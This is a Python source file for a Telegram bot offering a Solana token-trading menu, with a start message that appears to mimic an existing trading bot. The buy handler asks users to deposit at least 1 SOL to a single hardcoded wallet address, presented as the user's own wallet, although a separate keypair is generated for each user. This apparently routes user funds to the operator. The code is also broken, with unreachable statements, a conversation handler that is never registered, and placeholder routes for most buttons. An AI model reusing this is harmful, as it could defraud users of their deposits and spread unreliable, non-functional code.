#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""Simple inline keyboard bot with multiple CallbackQueryHandlers.

This Bot uses the Updater class to handle the bot.
First, a few callback functions are defined as callback query handler. Then, those functions are
passed to the Dispatcher and registered at their respective places.
Then, the bot is started and runs until we press Ctrl-C on the command line.
Usage:
Example of a bot that uses inline keyboard that has multiple CallbackQueryHandlers arranged in a
ConversationHandler.
Send /start to initiate the conversation.
Press Ctrl-C on the command line to stop the bot.
"""
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, ConversationHandler, MessageHandler, Filters
import logging
from bot_implement import generateKeyPair, client, getWalletBalance, is_valid_token_address
# import pyperclip

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)

logger = logging.getLogger(__name__)

# Stages
BUY, SELL, POSITIONS, LIMIT_ORDERS, DCA_ORDERS, COPY_TRADE, LP_SNIPER, NEW_PAIRS, REFERRALS, SETTINGS, BRIDGE, WITHDRAW, HELP, REFRESH = range(14)

wallet_address = ''
def start(update, context):
    """Send message on `/start`."""
    # Get user that sent /start and log his name
    user = update.message.from_user
    logger.info("User %s started the conversation.", user.first_name)
    print("User %s %s started the conversation.", user.first_name, user.username)
    # Build InlineKeyboard where each button has a displayed text
    # and a string as callback_data
    # The keyboard is a list of button rows, where each row is in turn
    # a list (hence `[[...]]`).
    keyboard = [
        [InlineKeyboardButton("Buy", callback_data=str(BUY)),
         InlineKeyboardButton("Sell", callback_data=str(SELL))],
        
        [InlineKeyboardButton("Positions", callback_data=str(POSITIONS)),
         InlineKeyboardButton("Limit Orders", callback_data=str(LIMIT_ORDERS)),
         
         InlineKeyboardButton("DCA Orders", callback_data=str(DCA_ORDERS))],
        [InlineKeyboardButton("Copy Trade", callback_data=str(COPY_TRADE)),
         InlineKeyboardButton("LP Sniper", callback_data=str(LP_SNIPER))],
        
        [InlineKeyboardButton("New Pairs", callback_data=str(NEW_PAIRS)),
         InlineKeyboardButton("Referrals", callback_data=str(REFERRALS)),
         InlineKeyboardButton("Settings", callback_data=str(SETTINGS))],
        
        [InlineKeyboardButton("Bridge", callback_data=str(BRIDGE)),
         InlineKeyboardButton("Withdraw", callback_data=str(WITHDRAW))],
        
        [InlineKeyboardButton("Help", callback_data=str(HELP)),
         InlineKeyboardButton("Refresh", callback_data=str(REFRESH))]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    # Send message with text and appended InlineKeyboard
    
    wallet_address, wallet_balance = generateKeyPair()

    msg = f"Solana·[🅴](https://solscan.io)\n{wallet_address}\nBalance: {wallet_balance}\n\nClick on the Refresh button to update your current balance.\n\n⚠️ We strongly advise that you use any of the following bots to trade with. You will have the same wallets and settings across all bots, but any of the below will be significantly faster due to lighter user load."
    
    # pyperclip.copy(wallet_address)
    # pyperclip.copy(wallet_balance)
    
    update.message.reply_text(
        # "Start handler, Choose a route",
        msg,
        parse_mode='Markdown',
        reply_markup=reply_markup
    )
    # Tell ConversationHandler that we're in state `FIRST` now
    return BUY


# def start_over(update, context):
#     """Prompt same text & keyboard as `start` does but not as new message"""
#     # Get CallbackQuery from Update
#     query = update.callback_query
#     # CallbackQueries need to be answered, even if no notification to the user is needed
#     # Some clients may have trouble otherwise. See https://core.telegram.org/bots/api#callbackquery
#     query.answer()
#     keyboard = [
#         [InlineKeyboardButton("1", callback_data=str(ONE)),
#          InlineKeyboardButton("2", callback_data=str(TWO))]
#     ]
#     reply_markup = InlineKeyboardMarkup(keyboard)
#     # Instead of sending a new message, edit the message that
#     # originated the CallbackQuery. This gives the feeling of an
#     # interactive menu.
#     query.edit_message_text(
#         text="Start handler, Choose a route",
#         reply_markup=reply_markup
#     )
#     return FIRST

def getTokenAddress(update, context):
    context.bot.send_message(chat_id=update.effective_chat.id, text="Enter a token symbol or address to buy")
    token_address = update.message.text
    # Here, you can add your logic to fetch and return information about the token address
    context.bot.send_message(chat_id=update.effective_chat.id, text=f"The token address you provided is: {token_address}")
    return token_address
    query = update.callback_query
    query.answer()
    

    # Use the MessageHandler to capture the user's response
    def handle_token_address(update, context):
        token_address = update.message.text
        
        # Validate the token address
        if is_valid_token_address(token_address):
            # Initiate the purchase process
            # try:
            #     purchase_token(token_address)
            #     context.bot.send_message(chat_id=update.effective_chat.id, text="Purchase successful!")
            # except Exception as e:
            #     context.bot.send_message(chat_id=update.effective_chat.id, text=f"Error: {str(e)}")
            
            # Return the appropriate conversation state
            print(token_address)
            return ConversationHandler.END
        else:
            context.bot.send_message(chat_id=update.effective_chat.id, text="Invalid token address. Please try again.")
            return getTokenAddress

    # Set up the MessageHandler to capture the user's response
    context.dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_token_address))

    # Return the getTokenAddress state to wait for the user's input
    return getTokenAddress

    
def buy(update, context):
    """Show new choice of buttons"""
    wallet_address = 'HGTGTnvisMt4pvcP3h3Z6LP732PewGqqgKY6UkLxB5qW'
    sol_balance = getWalletBalance(wallet_address)
    print(wallet_address, sol_balance)
    query = update.callback_query
    query.answer()
    if sol_balance < 1:
        msg = f"You need to deposit at least 1 SOL on your wallet for this function to work\n {wallet_address}\n (click to copy)"
        query.edit_message_text(text=msg)
        return BUY
    else:
        token_address_response = getTokenAddress(update, context)
        query.edit_message_text(text=query.message.text + "\n\n" + token_address_response)
        return BUY

def sell(update, context):
    """Show new choice of buttons"""
    query = update.callback_query
    query.answer()
    keyboard = [
        [InlineKeyboardButton("Buy", callback_data=str(BUY)),
         InlineKeyboardButton("Sell", callback_data=str(SELL))]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    query.edit_message_text(
        text="First CallbackQueryHandler, Choose a route",
        reply_markup=reply_markup
    )
    return BUY

def end(update, context):
    """Returns `ConversationHandler.END`, which tells the
    ConversationHandler that the conversation is over"""
    query = update.callback_query
    query.answer()
    query.edit_message_text(
        text="See you next time!"
    )
    return ConversationHandler.END



def main():
    # Create the Updater and pass it your bot's token.
    updater = Updater("your token here", use_context=True)

    # Get the dispatcher to register handlers
    dp = updater.dispatcher

    # Setup conversation handler with the states FIRST and SECOND
    # Use the pattern parameter to pass CallbackQueries with specific
    # data pattern to the corresponding handlers.
    # ^ means "start of line/string"
    # $ means "end of line/string"
    # So ^ABC$ will only allow 'ABC'
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            BUY: [CallbackQueryHandler(buy, pattern='^' + str(BUY) + '$')],
            SELL: [CallbackQueryHandler(sell, pattern='^' + str(SELL) + '$')],
            POSITIONS: [CallbackQueryHandler(buy, pattern='^' + str(POSITIONS) + '$')],
            LIMIT_ORDERS: [CallbackQueryHandler(buy, pattern='^' + str(LIMIT_ORDERS) + '$')],
            DCA_ORDERS: [CallbackQueryHandler(buy, pattern='^' + str(DCA_ORDERS) + '$')],
            COPY_TRADE: [CallbackQueryHandler(buy, pattern='^' + str(COPY_TRADE) + '$')],
            LP_SNIPER: [CallbackQueryHandler(buy, pattern='^' + str(LP_SNIPER) + '$')],
            NEW_PAIRS: [CallbackQueryHandler(buy, pattern='^' + str(NEW_PAIRS) + '$')],
            REFERRALS: [CallbackQueryHandler(buy, pattern='^' + str(REFERRALS) + '$')],
            SETTINGS: [CallbackQueryHandler(buy, pattern='^' + str(SETTINGS) + '$')],
            BRIDGE: [CallbackQueryHandler(buy, pattern='^' + str(BRIDGE) + '$')],
            WITHDRAW: [CallbackQueryHandler(buy, pattern='^' + str(WITHDRAW) + '$')],
            HELP: [CallbackQueryHandler(buy, pattern='^' + str(HELP) + '$')],
            REFRESH: [CallbackQueryHandler(buy, pattern='^' + str(REFRESH) + '$')],
        },
        fallbacks=[CommandHandler('start', start)]
    )

    # Add ConversationHandler to dispatcher that will be used for handling
    # updates
    # dp.add_handler(conv_handler)
    dp.add_handler(CommandHandler('start', start))
    dp.add_handler(CallbackQueryHandler(buy, pattern='^' + str(BUY) + '$'))
    dp.add_handler(CallbackQueryHandler(sell, pattern='^' + str(SELL) + '$'))
    dp.add_handler(CallbackQueryHandler(sell, pattern='^' + str(POSITIONS) + '$'))
    dp.add_handler(CallbackQueryHandler(sell, pattern='^' + str(LIMIT_ORDERS) + '$'))
    dp.add_handler(CallbackQueryHandler(sell, pattern='^' + str(DCA_ORDERS) + '$'))
    dp.add_handler(CallbackQueryHandler(sell, pattern='^' + str(COPY_TRADE) + '$'))
    dp.add_handler(CallbackQueryHandler(sell, pattern='^' + str(LP_SNIPER) + '$'))
    dp.add_handler(CallbackQueryHandler(sell, pattern='^' + str(NEW_PAIRS) + '$'))
    dp.add_handler(CallbackQueryHandler(sell, pattern='^' + str(REFERRALS) + '$'))
    dp.add_handler(CallbackQueryHandler(sell, pattern='^' + str(SETTINGS) + '$'))
    dp.add_handler(CallbackQueryHandler(sell, pattern='^' + str(BRIDGE) + '$'))
    dp.add_handler(CallbackQueryHandler(sell, pattern='^' + str(WITHDRAW) + '$'))
    dp.add_handler(CallbackQueryHandler(sell, pattern='^' + str(HELP) + '$'))
    dp.add_handler(CallbackQueryHandler(sell, pattern='^' + str(REFRESH) + '$'))

    # Start the Bot
    updater.start_polling()

    # Run the bot until you press Ctrl-C or the process receives SIGINT,
    # SIGTERM or SIGABRT. This should be used most of the time, since
    # start_polling() is non-blocking and will stop the bot gracefully.
    updater.idle()


if __name__ == '__main__':
    main()
